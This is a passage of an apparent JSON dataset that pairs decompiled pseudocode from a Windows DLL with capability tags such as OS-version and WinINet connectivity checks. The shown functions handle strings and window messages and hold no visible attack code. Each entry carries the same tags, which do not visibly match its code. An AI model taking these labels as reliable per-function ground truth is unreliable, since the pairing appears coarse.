        "decompiled_code": "\nvoid fcn.18002a460(int64_t arg1)\n\n{\n    code *pcVar1;\n    ulong *puVar2;\n    int64_t iVar3;\n    ushort *arg1_00;\n    ulong ****ppppuVar4;\n    uchar auStack168 [32];\n    ushort auStack136 [8];\n    ulong uStack120;\n    ulong uStack112;\n    ulong uStack104;\n    int64_t aiStack88 [3];\n    uint64_t uStack64;\n    ulong ****appppuStack56 [2];\n    ulong uStack40;\n    uint64_t uStack32;\n    uint64_t uStack24;\n    \n    uStack104 = 0xfffffffffffffffe;\n    uStack24 = *0x180123080 ^ auStack168;\n    uStack40 = 0;\n    uStack32 = 7;\n    appppuStack56[0] = appppuStack56[0] & 0xffffffffffff0000;\n    appppuStack56[0] = fcn.180011cf0(appppuStack56, 0x108);\n    uStack40 = 0x105;\n    uStack32 = 0x107;\n    ppppuVar4 = appppuStack56[0];\n    for (iVar3 = 0x105; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *ppppuVar4 = 0;\n        ppppuVar4 = ppppuVar4 + 2;\n    }\n    *(appppuStack56[0] + 0x20a) = 0;\n    (**0x1800de5f0)(*(arg1 + 200), appppuStack56[0], 0x104);\n    ppppuVar4 = appppuStack56;\n    if (7 < uStack32) {\n        ppppuVar4 = appppuStack56[0];\n    }\n    uStack120 = 0;\n    uStack112 = 7;\n    auStack136[0] = 0;\n    iVar3 = -1;\n    do {\n        iVar3 = iVar3 + 1;\n    } while (*(ppppuVar4 + iVar3 * 2) != 0);\n    arg1_00 = auStack136;\n    fcn.180010d70(arg1_00, ppppuVar4, iVar3);\n    puVar2 = fcn.18002ce00(arg1_00, aiStack88, auStack136);\n    if (7 < puVar2[3]) {\n        puVar2 = *puVar2;\n    }\n    (**0x1800de778)(*(arg1 + 0xc0), puVar2);\n    if (7 < uStack64) {\n        iVar3 = aiStack88[0];\n        if ((0xfff < uStack64 * 2 + 2) && (iVar3 = *(aiStack88[0] + -8),  0x1f < (aiStack88[0] - iVar3) - 8U))\n        goto code_r0x00018002a629;\n        fcn.18008fb24(iVar3);\n    }\n    if (7 < uStack32) {\n        ppppuVar4 = appppuStack56[0];\n        if (0xfff < uStack32 * 2 + 2) {\n            ppppuVar4 = appppuStack56[0][-1];\n            if (0x1f < appppuStack56[0] + (-8 - ppppuVar4)) {\n                fcn.1800b3528(ppppuVar4, uStack32 * 2 + 0x29);\ncode_r0x00018002a629:\n                fcn.1800b3528();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(ppppuVar4);\n    }\n    fcn.18008fb00(uStack24 ^ auStack168);\n    return;\n}\n",
        "token_count": 883
    },
    "18002a63": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.18002a630(int64_t arg1)\n\n{\n    uint16_t uVar1;\n    ulong arg2;\n    code *pcVar2;\n    int64_t iVar3;\n    uint16_t *puVar4;\n    uint64_t uVar5;\n    char cVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint16_t *puVar9;\n    char in_DL;\n    int16_t *arg2_00;\n    int64_t arg3;\n    ulong *arg2_01;\n    int64_t iVar10;\n    uint16_t *puVar11;\n    int64_t iVar12;\n    bool bVar13;\n    bool bVar14;\n    uchar auStack1752 [32];\n    uint16_t uStack1720;\n    unkbyte6 Stack1718;\n    int64_t iStack1704;\n    uint64_t uStack1696;\n    ushort uStack1688;\n    unkbyte6 Stack1686;\n    uint uStack1672;\n    uint uStack1668;\n    uint uStack1664;\n    uint uStack1660;\n    ulong uStack1656;\n    int16_t aiStack1640 [264];\n    int16_t aiStack1112 [264];\n    int16_t aiStack584 [264];\n    uint64_t uStack56;\n    \n    uStack1656 = 0xfffffffffffffffe;\n    uStack56 = *0x180123080 ^ auStack1752;\n    if (((*(arg1 + 99) != '\\0') || (iVar7 = (**0x1800de7f0)(*(arg1 + 0x70), 0x188, 0, 0),  iVar7 == -1)) ||\n       (iVar8 = (**0x1800de7f0)(*(arg1 + 0xb8), 0x188, 0, 0),  iVar8 == -1)) goto code_r0x00018002aa46;\n    iVar12 = iVar8;\n    arg2_01 = iVar12 * 0xa0 + *(iVar7 * 0xf0 + 0x68 + *(arg1 + 0xd8));\n    if (in_DL == '\\0') {\n        if (arg2_01[2] == 0) {\n            fcn.18002adb0(arg1);\n            goto code_r0x00018002aa46;\n        }\n        fcn.1800282f0(arg1, arg2_01);\n    }\n    else {\n        (**0x1800de728)(*(arg1 + 0x18), 0x23ba, aiStack584, 0x104);\n        arg3 = -1;\n        iVar10 = -1;\n        do {\n            iVar10 = iVar10 + 1;\n        } while (aiStack584[iVar10] != 0);\n        fcn.180010d70(arg2_01, aiStack584, iVar10);\n        (**0x1800de5f0)(*(arg1 + 200), aiStack1640);\n        uStack1672 = *0x180101900;\n        uStack1668 = *0x180101904;\n        uStack1664 = *0x180101908;\n        uStack1660 = *0x18010190c;\n        uStack1688 = 0;\n        fcn.180010d70(&uStack1688, 0x1800f6520, 0x18);\n        arg2 = *(arg1 + 0x18);\n        iStack1704 = CONCAT44(*0x180101904, *0x180101900);\n        uStack1696 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack1720 = 0;\n        iVar10 = -1;\n        do {\n            iVar10 = iVar10 + 1;\n        } while (aiStack1640[iVar10] != 0);\n        fcn.180010d70(&uStack1720, aiStack1640, iVar10);\n        cVar6 = fcn.180067c60(&uStack1720, arg2, &uStack1688);\n        if (7 < uStack1696) {\n            iVar3 = CONCAT62(Stack1718, uStack1720);\n            iVar10 = iVar3;\n            if ((uStack1696 * 2 + 2 < 0x1000) || (iVar10 = *(iVar3 + -8),  (iVar3 - iVar10) - 8U < 0x20)) {\n                fcn.18008fb24(iVar10);\n                goto code_r0x00018002a807;\n            }\ncode_r0x00018002aa77:\n            fcn.1800b3528();\ncode_r0x00018002aa7d:\n            fcn.1800b3528();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\ncode_r0x00018002a807:\n        iStack1704 = CONCAT44(*0x180101904, *0x180101900);\n        uStack1696 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack1720 = 0;\n        if (7 < CONCAT44(uStack1660, uStack1664)) {\n            iVar3 = CONCAT62(Stack1686, uStack1688);\n            iVar10 = iVar3;\n            if ((0xfff < CONCAT44(uStack1660, uStack1664) * 2 + 2) &&\n               (iVar10 = *(iVar3 + -8),  0x1f < (iVar3 - iVar10) - 8U)) goto code_r0x00018002aa7d;\n            fcn.18008fb24(iVar10);\n        }\n        if (cVar6 != '\\0') goto code_r0x00018002aa46;\n        iVar10 = -1;\n        do {\n            iVar10 = iVar10 + 1;\n        } while (aiStack1640[iVar10] != 0);\n        fcn.180010d70(arg2_01 + 4, aiStack1640, iVar10);\n        (**0x1800de5f0)(*(arg1 + 0xd0), aiStack1112, 0x104);\n        iStack1704 = CONCAT44(*0x180101904, *0x180101900);\n        uStack1696 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack1720 = 0;\n        iVar10 = -1;\n        do {\n            iVar10 = iVar10 + 1;\n        } while (aiStack1112[iVar10] != 0);\n        fcn.180010d70(&uStack1720, aiStack1112, iVar10);\n        uVar5 = uStack1696;\n        puVar4 = CONCAT62(Stack1718, uStack1720);\n        puVar11 = &uStack1720;\n        if (7 < uStack1696) {\n            puVar11 = puVar4;\n        }\n        if (iStack1704 == 0x1d) {\n            iVar10 = 0x1d;\n            puVar9 = 0x1800f6558;\n            uVar1 = *puVar11;\n            if (0x5a < uVar1) {\n                bVar13 = uVar1 < 0x5b;\n                bVar14 = uVar1 == 0x5b;\n                do {\n                    if (!bVar13 && !bVar14) break;\n                    if (iVar10 == 1) {\n                        bVar13 = true;\n                        goto code_r0x00018002a948;\n                    }\n                    iVar10 = iVar10 + -1;\n                    puVar9 = puVar9 + 1;\n                    bVar13 = *(puVar9 + puVar11 + -0xc007b2ac) < *puVar9;\n                    bVar14 = *(puVar9 + puVar11 + -0xc007b2ac) == *puVar9;\n                } while (!bVar13);\n            }\n        }\n        bVar13 = false;\ncode_r0x00018002a948:\n        arg2_00 = aiStack1112;\n        if (bVar13) {\n            arg2_00 = 0x1800f636c;\n        }\n        do {\n            arg3 = arg3 + 1;\n        } while (arg2_00[arg3] != 0);\n        fcn.180010d70(arg2_01 + 0x10, arg2_00, arg3);\n        if (7 < uVar5) {\n            puVar11 = puVar4;\n            if ((0xfff < uVar5 * 2 + 2) && (puVar11 = *(puVar4 + -4),  0x1f < puVar4 + (-8 - puVar11))) {\n                fcn.1800b3528();\n                goto code_r0x00018002aa77;\n            }\n            fcn.18008fb24(puVar11);\n        }\n    }\n    (**0x1800de7f0)(*(arg1 + 0xb8), 0x182, iVar12, 0);\n    if (7 < arg2_01[3]) {\n        arg2_01 = *arg2_01;\n    }\n    (**0x1800de7f0)(*(arg1 + 0xb8), 0x181, iVar12, arg2_01);\n    (**0x1800de7f0)(*(arg1 + 0xb8), 0x186, iVar12, 0);\n    *(arg1 + 0x61) = 0;\n    *(arg1 + 99) = 1;\n    fcn.180028690(arg1);\ncode_r0x00018002aa46:\n    fcn.18008fb00(uStack56 ^ auStack1752);\n    return;\n}\n",
        "token_count": 2176
    },
    "18002af7": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18002af70(int64_t arg1)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    char cVar4;\n    int32_t iVar5;\n    uint uVar6;\n    ulong uVar7;\n    int64_t *piVar8;\n    ushort *puVar9;\n    uint *puVar10;\n    ulong arg3;\n    char in_DL;\n    ushort *puVar11;\n    int64_t iVar12;\n    ulong *puVar13;\n    uint32_t uVar14;\n    ulong *puVar15;\n    ulong *arg2;\n    uchar auStack2472 [32];\n    ulong uStack2440;\n    uint32_t uStack2424;\n    ushort uStack2416;\n    ushort uStack2414;\n    uint uStack2412;\n    uint uStack2408;\n    uint uStack2404;\n    ulong uStack2400;\n    uint64_t uStack2392;\n    uint uStack2384;\n    uint uStack2380;\n    uint uStack2376;\n    uint uStack2372;\n    uint64_t uStack2368;\n    uint64_t uStack2360;\n    ulong uStack2352;\n    uint uStack2344;\n    uint uStack2340;\n    int64_t iStack2336;\n    uint64_t uStack2328;\n    ulong uStack2320;\n    int64_t iStack2304;\n    uint64_t uStack2296;\n    ulong *puStack2288;\n    ushort uStack2280;\n    unkbyte6 Stack2278;\n    ulong uStack2264;\n    uint64_t uStack2256;\n    int64_t iStack2248;\n    ushort uStack2240;\n    unkbyte6 Stack2238;\n    ulong uStack2224;\n    uint64_t uStack2216;\n    ulong uStack2208;\n    int64_t aiStack2200 [3];\n    uint64_t uStack2176;\n    int16_t aiStack2168 [264];\n    int16_t aiStack1640 [264];\n    int16_t aiStack1112 [264];\n    int16_t aiStack584 [264];\n    uint64_t uStack56;\n    \n    uStack2208 = 0xfffffffffffffffe;\n    uStack56 = *0x180123080 ^ auStack2472;\n    if ((*(arg1 + 0x62) == '\\0') && (iVar5 = (**0x1800de7f0)(*(arg1 + 0x70), 0x188, 0, 0),  iVar5 != -1)) {\n        iVar12 = iVar5;\n        arg2 = iVar12 * 0xf0 + *(arg1 + 0xd8);\n        iStack2248 = iVar12;\n        if (in_DL == '\\0') {\n            if (arg2[2] == 0) {\n                fcn.18002c100(arg1);\n                goto code_r0x00018002b730;\n            }\n            fcn.180027880(arg1, arg2);\n        }\n        else {\n            (**0x1800de728)(*(arg1 + 0x18), 0x2392, aiStack2168, 0x104);\n            iVar12 = -1;\n            do {\n                iVar12 = iVar12 + 1;\n            } while (aiStack2168[iVar12] != 0);\n            fcn.180010d70(arg2, aiStack2168, iVar12);\n            (**0x1800de5f0)(*(arg1 + 0x80), aiStack2168, 0x104);\n            iVar12 = -1;\n            do {\n                iVar12 = iVar12 + 1;\n            } while (aiStack2168[iVar12] != 0);\n            fcn.180010d70(arg2 + 4, aiStack2168, iVar12);\n            (**0x1800de5f0)(*(arg1 + 0x78), aiStack1112, 0x104);\n            iVar12 = -1;\n            do {\n                iVar12 = iVar12 + 1;\n            } while (aiStack1112[iVar12] != 0);\n            fcn.180010d70(arg2 + 8, aiStack1112, iVar12);\n            iVar5 = (**0x1800de740)(*(arg1 + 0x18), 0x23a8);\n            *(arg2 + 0xc) = iVar5 == 1;\n            uStack2424 = 0;\n            puVar15 = arg1 + 0xa0;\n            puVar13 = arg2 + 0x10;\n            do {\n                uVar14 = uStack2424;\n                puStack2288 = puVar13;\n                (**0x1800de5f0)(puVar15[-3], aiStack584, 0x104);\n                uStack2400 = 0;\n                uStack2392 = 7;\n                uStack2416 = 0;\n                iVar12 = -1;\n                do {\n                    iVar12 = iVar12 + 1;\n                } while (aiStack584[iVar12] != 0);\n                fcn.180010d70(&uStack2416, aiStack584, iVar12);\n                uVar6 = fcn.180067a70(&uStack2416, 10);\n                *puVar13 = uVar6;\n                if (7 < uStack2392) {\n                    iVar2 = CONCAT44(uStack2412, CONCAT22(uStack2414, uStack2416));\n                    iVar12 = iVar2;\n                    if (uStack2392 * 2 + 2 < 0x1000) {\ncode_r0x00018002b19b:\n                        fcn.18008fb24(iVar12);\n                        goto code_r0x00018002b1a0;\n                    }\n                    iVar12 = *(iVar2 + -8);\n                    if ((iVar2 - iVar12) - 8U < 0x20) goto code_r0x00018002b19b;\n                    fcn.1800b3528(iVar12, uStack2392 * 2 + 0x29);\ncode_r0x00018002b76c:\n                    fcn.1800b3528();\ncode_r0x00018002b772:\n                    fcn.1800b3528();\ncode_r0x00018002b778:\n                    fcn.1800b3528();\ncode_r0x00018002b77e:\n                    fcn.1800b3528();\ncode_r0x00018002b784:\n                    fcn.1800b3528();\ncode_r0x00018002b78a:\n                    fcn.1800b3528();\n                    pcVar1 = swi(3);\n                    (*pcVar1)();\n                    return;\n                }\ncode_r0x00018002b1a0:\n                (**0x1800de5f0)(*puVar15);\n                uVar14 = uVar14 + 1;\n                uVar7 = fcn.180020b50(aiStack2200, uVar14);\n                iStack2304 = 0;\n                uStack2296 = 7;\n                uStack2320._0_2_ = 0;\n                fcn.180010d70(&uStack2320, 0x1800f6690, 0x15);\n                if (uStack2296 - iStack2304 < 3) {\n                    uStack2440 = 3;\n                    piVar8 = fcn.180013690(&uStack2320, 3, 0, 0x1800f6688);\n                }\n                else {\n                    iVar12 = iStack2304 + 3;\n                    puVar11 = &uStack2320;\n                    if (7 < uStack2296) {\n                        puVar11 = CONCAT62(uStack2320._2_6_, uStack2320);\n                    }\n                    puVar9 = puVar11 + iStack2304;\n                    iStack2304 = iVar12;\n                    fcn.1800ade80(puVar9, 0x1800f6688, 6);\n                    puVar11[iVar12] = 0;\n                    piVar8 = &uStack2320;\n                }\n                iStack2336 = 0;\n                uStack2328 = 0;\n                puVar11 = *piVar8;\n                uStack2352._0_2_ = *piVar8;\n                uStack2352._2_2_ = *piVar8 >> 0x10;\n                uStack2352._4_4_ = *(piVar8 + 4);\n                uStack2344 = *(piVar8 + 1);\n                uStack2340 = *(piVar8 + 0xc);\n                iStack2336 = piVar8[2];\n                uStack2328 = piVar8[3];\n                piVar8[2] = 0;\n                piVar8[3] = 7;\n                *piVar8 = 0;\n                if (uStack2328 - iStack2336 < 8) {\n                    uStack2440 = 8;\n                    piVar8 = fcn.180013690(&uStack2352, 8, 0, 0x1800f6670);\n                }\n                else {\n                    iVar12 = iStack2336 + 8;\n                    puVar9 = &uStack2352;\n                    if (7 < uStack2328) {\n                        puVar9 = puVar11;\n                    }\n                    puVar11 = puVar9 + iStack2336;\n                    iStack2336 = iVar12;\n                    fcn.1800ade80(puVar11, 0x1800f6670, 0x10);\n                    puVar9[iVar12] = 0;\n                    piVar8 = &uStack2352;\n                }\n                uStack2368 = 0;\n                uStack2360 = 0;\n                puVar11 = *piVar8;\n                uStack2384._0_2_ = *piVar8;\n                uStack2384._2_2_ = *piVar8 >> 0x10;\n                uStack2380 = *(piVar8 + 4);\n                uStack2376 = *(piVar8 + 1);\n                uStack2372 = *(piVar8 + 0xc);\n                uVar3 = piVar8[2];\n                uStack2360 = piVar8[3];\n                piVar8[2] = 0;\n                piVar8[3] = 7;\n                *piVar8 = 0;\n                if (uStack2360 == uVar3) {\n                    uStack2440 = 1;\n                    uStack2368 = uVar3;\n                    puVar10 = fcn.180013690(&uStack2384, 1, 0, 0x1800f6384);\n                }\n                else {\n                    uStack2368 = uVar3 + 1;\n                    puVar9 = &uStack2384;\n                    if (7 < uStack2360) {\n                        puVar9 = puVar11;\n                    }\n                    puVar9[uVar3] = 0x20;\n                    puVar9[uVar3 + 1] = 0;\n                    puVar10 = &uStack2384;\n                }\n                uStack2412 = puVar10[1];\n                uStack2408 = puVar10[2];\n                uStack2404 = puVar10[3];\n                uStack2416 = *puVar10;\n                uStack2414 = *puVar10 >> 0x10;\n                uStack2400 = *(puVar10 + 4);\n                uStack2392 = *(puVar10 + 6);\n                *(puVar10 + 4) = 0;\n                *(puVar10 + 6) = 7;\n                *puVar10 = 0;\n                arg3 = fcn.18002e490(&uStack2240, &uStack2416, uVar7);\n                uVar7 = *(arg1 + 0x18);\n                uStack2264 = 0;\n                uStack2256 = 7;\n                uStack2280 = 0;\n                iVar12 = -1;\n                do {\n                    iVar12 = iVar12 + 1;\n                } while (aiStack1640[iVar12] != 0);\n                fcn.180010d70(&uStack2280, aiStack1640, iVar12);\n                cVar4 = fcn.180067c60(&uStack2280, uVar7, arg3);\n                if (7 < uStack2256) {\n                    iVar2 = CONCAT62(Stack2278, uStack2280);\n                    iVar12 = iVar2;\n                    if ((0xfff < uStack2256 * 2 + 2) && (iVar12 = *(iVar2 + -8),  0x1f < (iVar2 - iVar12) - 8U))\n                    goto code_r0x00018002b76c;\n                    fcn.18008fb24(iVar12);\n                }\n                uStack2264 = 0;\n                uStack2256 = 7;\n                uStack2280 = 0;\n                if (7 < uStack2216) {\n                    iVar2 = CONCAT62(Stack2238, uStack2240);\n                    iVar12 = iVar2;\n                    if ((0xfff < uStack2216 * 2 + 2) && (iVar12 = *(iVar2 + -8),  0x1f < (iVar2 - iVar12) - 8U))\n                    goto code_r0x00018002b772;\n                    fcn.18008fb24(iVar12);\n                }\n                uStack2224 = 0;\n                uStack2216 = 7;\n                uStack2240 = 0;\n                if (7 < uStack2392) {\n                    iVar2 = CONCAT44(uStack2412, CONCAT22(uStack2414, uStack2416));\n                    iVar12 = iVar2;\n                    if ((0xfff < uStack2392 * 2 + 2) && (iVar12 = *(iVar2 + -8),  0x1f < (iVar2 - iVar12) - 8U))\n                    goto code_r0x00018002b778;\n                    fcn.18008fb24(iVar12);\n                }\n                uStack2400 = 0;\n                uStack2392 = 7;\n                uStack2416 = 0;\n                if (7 < uStack2360) {\n                    iVar2 = CONCAT44(uStack2380, CONCAT22(uStack2384._2_2_, uStack2384));\n                    iVar12 = iVar2;\n                    if ((0xfff < uStack2360 * 2 + 2) && (iVar12 = *(iVar2 + -8),  0x1f < (iVar2 - iVar12) - 8U))\n                    goto code_r0x00018002b77e;\n                    fcn.18008fb24(iVar12);\n                }\n                uStack2368 = 0;\n                uStack2360 = 7;\n                uStack2384._0_2_ = 0;\n                if (7 < uStack2328) {\n                    iVar2 = CONCAT44(uStack2352._4_4_, CONCAT22(uStack2352._2_2_, uStack2352));\n                    iVar12 = iVar2;\n                    if ((0xfff < uStack2328 * 2 + 2) && (iVar12 = *(iVar2 + -8),  0x1f < (iVar2 - iVar12) - 8U))\n                    goto code_r0x00018002b784;\n                    fcn.18008fb24(iVar12);\n                }\n                iStack2336 = 0;\n                uStack2328 = 7;\n                uStack2352._0_2_ = 0;\n                if (7 < uStack2296) {\n                    iVar2 = CONCAT62(uStack2320._2_6_, uStack2320);\n                    iVar12 = iVar2;\n                    if ((0xfff < uStack2296 * 2 + 2) && (iVar12 = *(iVar2 + -8),  0x1f < (iVar2 - iVar12) - 8U))\n                    goto code_r0x00018002b78a;\n                    fcn.18008fb24(iVar12);\n                }\n                iStack2304 = 0;\n                uStack2296 = 7;\n                uStack2320._0_2_ = 0;\n                if (7 < uStack2176) {\n                    iVar12 = aiStack2200[0];\n                    if (0xfff < uStack2176 * 2 + 2) {\n                        iVar12 = *(aiStack2200[0] + -8);\n                        if (0x1f < (aiStack2200[0] - iVar12) - 8U) {\n                            fcn.1800b3528(iVar12, uStack2176 * 2 + 0x29);\n                            pcVar1 = swi(3);\n                            (*pcVar1)();\n                            return;\n                        }\n                    }\n                    fcn.18008fb24(iVar12);\n                }\n                if (cVar4 != '\\0') goto code_r0x00018002b730;\n                iVar12 = -1;\n                do {\n                    iVar12 = iVar12 + 1;\n                } while (aiStack1640[iVar12] != 0);\n                fcn.180010d70(arg2 + uStack2424 * 4 + 0x12, aiStack1640, iVar12);\n                puVar13 = puStack2288 + 4;\n                puVar15 = puVar15 + 1;\n                iVar12 = iStack2248;\n                uStack2424 = uVar14;\n                puStack2288 = puVar13;\n            } while (uVar14 < 3);\n        }\n        (**0x1800de7f0)(*(arg1 + 0x70), 0x182, iVar12, 0);\n        if (7 < arg2[3]) {\n            arg2 = *arg2;\n        }\n        (**0x1800de7f0)(*(arg1 + 0x70), 0x181, iVar12, arg2);\n        (**0x1800de7f0)(*(arg1 + 0x70), 0x186, iVar12, 0);\n        *(arg1 + 0x61) = 0x100;\n        fcn.180027c20(arg1);\n    }\ncode_r0x00018002b730:\n    fcn.18008fb00(uStack56 ^ auStack2472);\n    return;\n}\n",
        "token_count": 4102
    },
    "18002b79": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18002b790(int64_t arg1, ulong *arg2)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    char cVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    uint *puVar6;\n    uchar *puVar7;\n    int64_t iVar8;\n    uint64_t uVar9;\n    ulong *puVar10;\n    ushort *puVar11;\n    int32_t iVar12;\n    ulong var_40h;\n    ulong var_50h;\n    ulong var_58h;\n    ulong var_60h;\n    ulong var_68h_2;\n    ulong var_70h;\n    ulong var_80h;\n    ulong var_170h;\n    uchar auStack696 [32];\n    uchar *puStack664;\n    uchar *puStack656;\n    uchar uStack648;\n    unkbyte7 Stack647;\n    ulong uStack632;\n    uint64_t uStack624;\n    ushort uStack616;\n    unkbyte6 Stack614;\n    ulong uStack600;\n    uint64_t uStack592;\n    uchar *puStack584;\n    uchar uStack576;\n    unkbyte7 Stack575;\n    ulong uStack560;\n    uint64_t uStack552;\n    ulong uStack544;\n    uchar auStack536 [32];\n    uchar auStack504 [128];\n    uint uStack376;\n    uint uStack372;\n    uint uStack368;\n    uint uStack364;\n    int64_t iStack360;\n    uint64_t uStack352;\n    uchar auStack344 [16];\n    int64_t iStack328;\n    uchar auStack312 [184];\n    ulong var_78h;\n    ulong var_70h_2;\n    ulong var_68h;\n    ulong var_60h_2;\n    uint64_t var_40h_2;\n    \n    uStack544 = 0xfffffffffffffffe;\n    var_40h_2 = *0x180123080 ^ auStack696;\n    auStack344 = ZEXT816(0);\n    iVar12 = 0;\n    iStack328 = 0;\n    iStack360 = 0;\n    uStack352 = 7;\n    uStack376._0_2_ = 0;\n    uVar5 = fcn.1800687b0(auStack504);\n    puVar10 = arg2;\n    if (7 < arg2[3]) {\n        puVar10 = *arg2;\n    }\n    fcn.180068c50(uVar5, &uStack616, puVar10, puVar10 + arg2[2] * 2);\n    puVar7 = auStack504;\n    fcn.1800686c0(puVar7);\n    iVar4 = fcn.180008fa0(puVar7, auStack344, &uStack616);\n    if (0 < iVar4) {\n        do {\n            puStack584 = auStack536;\n            uVar5 = fcn.1800687b0(auStack504);\n            puVar10 = arg2;\n            if (7 < arg2[3]) {\n                puVar10 = *arg2;\n            }\n            fcn.180068c50(uVar5, auStack536, puVar10, puVar10 + arg2[2] * 2);\n            fcn.1800686c0(auStack504);\n            uStack560 = 0;\n            uStack552 = 0xf;\n            uStack576 = 0;\n            fcn.180011120(&uStack576, 0x1800f46db, 0);\n            uStack632 = 0;\n            uStack624 = 0xf;\n            uStack648 = 0;\n            puVar7 = &uStack648;\n            fcn.180011120(puVar7, 0x1800f66c0, 9);\n            puStack656 = auStack536;\n            puStack664 = &uStack576;\n            puVar6 = fcn.180004f50(puVar7, &uStack616, auStack344._0_8_ + iVar12 * 0x20, &uStack648);\n            if (&uStack376 != puVar6) {\n                if (7 < uStack352) {\n                    iVar2 = CONCAT44(uStack372, CONCAT22(uStack376._2_2_, uStack376));\n                    iVar8 = iVar2;\n                    if ((0xfff < uStack352 * 2 + 2) && (iVar8 = *(iVar2 + -8),  0x1f < (iVar2 - iVar8) - 8U))\n                    goto code_r0x00018002bc77;\n                    fcn.18008fb24(iVar8);\n                }\n                uStack372 = puVar6[1];\n                uStack368 = puVar6[2];\n                uStack364 = puVar6[3];\n                uStack376._0_2_ = *puVar6;\n                uStack376._2_2_ = *puVar6 >> 0x10;\n                iStack360 = *(puVar6 + 4);\n                uStack352 = *(puVar6 + 6);\n                *(puVar6 + 4) = 0;\n                *(puVar6 + 6) = 7;\n                *puVar6 = 0;\n            }\n            if (7 < uStack592) {\n                iVar2 = CONCAT62(Stack614, uStack616);\n                iVar8 = iVar2;\n                if ((0xfff < uStack592 * 2 + 2) && (iVar8 = *(iVar2 + -8),  0x1f < (iVar2 - iVar8) - 8U))\n                goto code_r0x00018002bc77;\n                fcn.18008fb24(iVar8);\n            }\n            uStack600 = 0;\n            uStack592 = 7;\n            uStack616 = 0;\n            if (0xf < uStack624) {\n                iVar2 = CONCAT71(Stack647, uStack648);\n                iVar8 = iVar2;\n                if ((0xfff < uStack624 + 1) && (iVar8 = *(iVar2 + -8),  0x1f < (iVar2 - iVar8) - 8U))\n                goto code_r0x00018002bc7d;\n                fcn.18008fb24(iVar8);\n            }\n            uStack632 = 0;\n            uStack624 = 0xf;\n            uStack648 = 0;\n            if (0xf < uStack552) {\n                iVar2 = CONCAT71(Stack575, uStack576);\n                iVar8 = iVar2;\n                if ((0xfff < uStack552 + 1) && (iVar8 = *(iVar2 + -8),  0x1f < (iVar2 - iVar8) - 8U))\n                goto code_r0x00018002bc83;\n                fcn.18008fb24(iVar8);\n            }\n            if (iStack360 != 0) {\n                iVar8 = arg1;\n                cVar3 = fcn.18002c1f0(arg1, 0);\n                if (cVar3 == '\\0') break;\n                fcn.180025140(iVar8, auStack312);\n                iVar8 = *(arg1 + 0xe0);\n                if (iVar8 == *(arg1 + 0xe8)) {\n                    fcn.18002eb70(arg1 + 0xd8, iVar8, auStack312);\n                }\n                else {\n                    fcn.180024ec0(iVar8, auStack312);\n                    *(arg1 + 0xe0) = *(arg1 + 0xe0) + 0xf0;\n                }\n                iVar8 = *(arg1 + 0xe0) - *(arg1 + 0xd8);\n                iVar8 = SUB168(SEXT816(-0x7777777777777777) * SEXT816(iVar8) >> 0x40, 0) + iVar8;\n                fcn.180022e90(arg1, ((iVar8 >> 7) - (iVar8 >> 0x3f)) - 1, auStack344._0_8_ + iVar12 * 0x20, arg2);\n                puVar11 = &uStack376;\n                if (7 < uStack352) {\n                    puVar11 = CONCAT44(uStack372, CONCAT22(uStack376._2_2_, uStack376));\n                }\n                (**0x1800de7f0)(*(arg1 + 0x70), 0x180, 0, puVar11);\n                fcn.180025000(auStack312);\n            }\n            iVar12 = iVar12 + 1;\n        } while (iVar12 < iVar4);\n    }\n    iVar8 = *(arg1 + 0xe0) - *(arg1 + 0xd8);\n    iVar8 = SUB168(SEXT816(-0x7777777777777777) * SEXT816(iVar8) >> 0x40, 0) + iVar8;\n    (**0x1800de7f0)(*(arg1 + 0x70), 0x186, (-1 - (iVar8 >> 0x3f)) + (iVar8 >> 7), 0);\n    fcn.1800277d0(arg1);\n    *(arg1 + 0x61) = 0;\n    fcn.180027c20(arg1);\n    if (7 < uStack352) {\n        iVar2 = CONCAT44(uStack372, CONCAT22(uStack376._2_2_, uStack376));\n        iVar8 = iVar2;\n        if ((0xfff < uStack352 * 2 + 2) && (iVar8 = *(iVar2 + -8),  0x1f < (iVar2 - iVar8) - 8U))\n        goto code_r0x00018002bc71;\n        fcn.18008fb24(iVar8);\n    }\n    iStack360 = 0;\n    uStack352 = 7;\n    uStack376._0_2_ = 0;\n    if (auStack344._0_8_ != 0) {\n        fcn.180013b30(auStack344._0_8_, auStack344._8_8_);\n        uVar9 = iStack328 - auStack344._0_8_ & 0xffffffffffffffe0;\n        iVar8 = auStack344._0_8_;\n        if (0xfff < uVar9) {\n            iVar8 = *(auStack344._0_8_ + -8);\n            if (0x1f < (auStack344._0_8_ - iVar8) - 8U) {\n                fcn.1800b3528(iVar8, uVar9 + 0x27);\ncode_r0x00018002bc71:\n                fcn.1800b3528();\ncode_r0x00018002bc77:\n                fcn.1800b3528();\ncode_r0x00018002bc7d:\n                fcn.1800b3528();\ncode_r0x00018002bc83:\n                fcn.1800b3528();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar8);\n    }\n    fcn.18008fb00(var_40h_2 ^ auStack696);\n    